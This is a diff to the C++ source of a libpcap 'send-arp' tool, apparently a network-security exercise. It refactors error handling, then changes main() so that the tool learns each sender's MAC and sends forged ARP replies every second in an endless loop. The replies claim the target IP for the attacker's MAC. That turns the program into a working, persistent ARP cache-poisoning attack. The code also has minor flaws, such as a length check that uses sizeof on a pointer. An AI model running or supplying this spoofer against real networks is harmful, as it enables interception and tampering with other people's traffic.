@@ -4,6 +4,7 @@
 #include "arphdr.h"
 #include <string>
 #include <ifaddrs.h>
+#include <unistd.h>
 
 
 #pragma pack(push, 1)
@@ -18,11 +19,11 @@ void usage() {
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-Mac find_my_MAC(char *interface_name){
+int get_my_MAC(Mac* result, char *interface_name){
     char filename[100] = "/sys/class/net/";
     if(sizeof(interface_name) > 80){
         fprintf(stderr, "interface name is too long\n");
-        exit(-1);
+        return -1;
     }
     strcat(filename, interface_name);
     strncat(filename, "/address", 9);
@@ -31,18 +32,18 @@ Mac find_my_MAC(char *interface_name){
     int ret = fscanf(my_net_file, "%s", addr);
     if(ret == EOF){
         fprintf(stderr, "cannot find address file");
-        exit(-1);
+        return -1;
     }
-
-    return Mac(addr);
+    *result = Mac(addr);
+    return 0;
 }
 
-char* find_my_IP(char *interface_name){
+int get_my_IP(Ip* result, char *interface_name){
     struct ifaddrs *myaddrs;
     int ret = getifaddrs(&myaddrs);
     if(ret == EOF){
         fprintf(stderr, "cannot find my ip addr");
-        exit(-1);
+        return -1;
     }
     struct ifaddrs *tmp = myaddrs;
     while(tmp){
@@ -53,13 +54,14 @@ char* find_my_IP(char *interface_name){
     }
     if(!tmp){
         fprintf(stderr, "cannot find interface");
-        exit(-1);
+        return -1;
     }
     sockaddr_in *myaddr = (sockaddr_in *)(tmp->ifa_addr);
-    return inet_ntoa(myaddr->sin_addr);
+    *result = Ip(ntohl(myaddr->sin_addr.s_addr));
+    return 0;
 }
 
-void sendARP_req(pcap_t *handle, Mac smac, char *sip, char *tip){
+int sendARP_req(pcap_t *handle, Mac smac, Ip sip, Ip tip){
     EthArpPacket packet;
     packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
     packet.eth_.smac_ = Mac(smac);
@@ -71,17 +73,19 @@ void sendARP_req(pcap_t *handle, Mac smac, char *sip, char *tip){
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(smac);
-    packet.arp_.sip_ = htonl(Ip(sip));
+    packet.arp_.sip_ = htonl(sip);
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arp_.tip_ = htonl(Ip(tip));
+    packet.arp_.tip_ = htonl(tip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        return -1;
     }
+    return 0;
 }
 
-void sendARP_reply(pcap_t *handle, Mac dmac, Mac smac, char *sip, char *tip){
+int sendARP_reply(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Ip tip){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac(dmac);
@@ -94,26 +98,28 @@ void sendARP_reply(pcap_t *handle, Mac dmac, Mac smac, char *sip, char *tip){
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(smac);
-    packet.arp_.sip_ = htonl(Ip(sip));
+    packet.arp_.sip_ = htonl(sip);
     packet.arp_.tmac_ = Mac(dmac);
-    packet.arp_.tip_ = htonl(Ip(tip));
+    packet.arp_.tip_ = htonl(tip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        return -1;
     }
+    return 0;
 }
 
-Mac find_mac(pcap_t *handle, Mac smac, char *sip, char *tip){
+int resolve_mac(Mac* result, pcap_t *handle, Mac smac, Ip sip, Ip tip){
     sendARP_req(handle, smac, sip, tip);
     PEthHdr ethernet;
     PArpHdr arp;
-    while (true) {
+    int count = 0;
+    while (count < 40) {
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
-        sendARP_req(handle, smac, sip, tip);
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             break;
@@ -123,9 +129,13 @@ Mac find_mac(pcap_t *handle, Mac smac, char *sip, char *tip){
         arp = (PArpHdr)(packet + sizeof(*ethernet));
         if(arp->op() != ArpHdr::Reply) continue;
         if(arp->sip() == Ip(tip)){
-            return arp->smac();
+            *result = arp->smac();
+            return 0;
         }
+        count++;
     }
+    fprintf(stderr, "couldn't find ARP reply in 40 sequence");
+    return -1;
 }
 
 int main(int argc, char* argv[]) {
@@ -143,26 +153,46 @@ int main(int argc, char* argv[]) {
     }
 
     Mac attacker_mac;
-    char *attacker_ip;
+    Ip attacker_ip;
     Mac *sender_mac_arr;
 
-    attacker_mac = find_my_MAC(dev);
-    attacker_ip = find_my_IP(dev);
+    int ret;
 
-    sender_mac_arr = (Mac *)malloc(sizeof(Mac) * (argc-2) / 2);
-    for(int i=2,j=0;i<argc;i=i+2,j++){
-        sender_mac_arr[j] = find_mac(handle, attacker_mac, attacker_ip, argv[i]);
-    }
-    for(int i=2,j=0;i<argc;i=i+2,j++){
-        sendARP_reply(handle, sender_mac_arr[j], attacker_mac, argv[i+1], argv[i]);
+    ret = get_my_MAC(&attacker_mac, dev);
+    if (ret != 0){
+        fprintf(stderr, "couldn't find my MAC\n");
+        return -1;
     }
 
-    free(sender_mac_arr);
+    ret = get_my_IP(&attacker_ip, dev);
+    if (ret != 0){
+        fprintf(stderr, "couldn't find my IP\n");
+        return -1;
+    }
+
+    sender_mac_arr = new Mac[((argc-2) / 2)];
+    for(int i=2,j=0;i<argc;i=i+2,j++){
+        ret = resolve_mac(sender_mac_arr+j, handle, attacker_mac, attacker_ip, Ip(argv[i]));
+        if (ret != 0){
+            fprintf(stderr, "couldn't find my Mac addr of %s\n", argv[i]);
+            return -1;
+        }
+    }
+
+    while(1){
+        sleep(1);
+        for(int i=2,j=0;i<argc;i=i+2,j++){
+            ret = sendARP_reply(handle, sender_mac_arr[j], attacker_mac, Ip(argv[i+1]), Ip(argv[i]));
+            if (ret != 0){
+                fprintf(stderr, "couldn't find my Mac addr of %s\n", argv[i]);
+                return -1;
+            }
+        }
+    }
+
+    delete[] sender_mac_arr;
     pcap_close(handle);
 }
-
-
-
 
 
 
